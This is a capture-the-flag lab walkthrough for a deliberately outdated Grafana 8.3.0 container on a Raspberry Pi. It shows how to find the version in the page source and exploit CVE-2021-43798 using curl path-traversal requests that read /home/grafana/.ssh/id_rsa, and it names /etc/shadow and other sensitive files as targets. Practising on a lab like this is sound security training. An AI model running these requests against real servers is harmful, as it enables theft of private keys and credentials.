## CTF-pi - Outdated software - Grafana 2 - Difficulty: ★★★☆☆

### Scenario 

Grafana verison has changed, how about this time, is it secure?

There's no login provided for this challenge, but do we even need it?

### Prerequisites

Your Raspberry Pi has remote connection set up via Raspberry Pi Connect or VNC.

Have cloned this `CTF-pi` repository and are inside the `ctfpi0_0` directory.

`docker compose` works.


### Objective

Run within this directory on Raspi: `docker compose up --build -d` (Using remote shell)

`hostname -I` to find out which IP the service is running on and visit it in your browser. Your main computer or even a phone can access this, as long as they are within the same network as Raspberry Pi.

Which port is Grafana running on by default? Find out.

Find the Grafana version.

Find an existing vulnerability and exploit it.

There's plenty of sensitive files in Linux, find which one contains the flag.

Once you have found the flag check if they match: `answers/flag.txt`.


### Steps to complete

Google reveals that default Grafana port is 3000, and `hostname -I` reveals the IP, in my case the address to the service is: `10.10.10.67:3000`.

Enter this into your URL bar of your browser and you land on Grafana login page. 

We don't know the username or password, how do we find the version? I found them from page source! "subTitle":"Grafana v8.3.0

Google for Grafana exploits for the verion it is currently running on.

https://vulncheck.com/blog/grafana-cve-2021-43798

Made script that does everything automatically: https://www.exploit-db.com/exploits/50581

I ran this:
```
curl 'http://10.10.10.67:3000/public/plugins/zipkin/../../../../../../../../<path>/<filename>' --path-as-is --output text.txt

```
There's files like /etc/passwd; /etc/shadow ; grafana configuration files ; grafana.db ; /home/grafana/.ssh/id_rsa, let's try the last one.

We can read the file contents from the saved `text.txt` file: `cat text.txt`

```
curl 'http://10.10.10.67:3000/public/plugins/zipkin/../../../../../../../../home/grafana/.ssh/id_rsa' --path-as-is --output text.txt

```

What we just did is arbitrary path traversal, the user can input however many ../ they want so they get to the root directory, there's plenty of sensitive files like databases or device users with their password hashes, also private ssh keys, if attacker can reach these, then there's a high chance they can take control of everything on the Rasperry Pi in this case.

### Cleaning up

`docker compose down`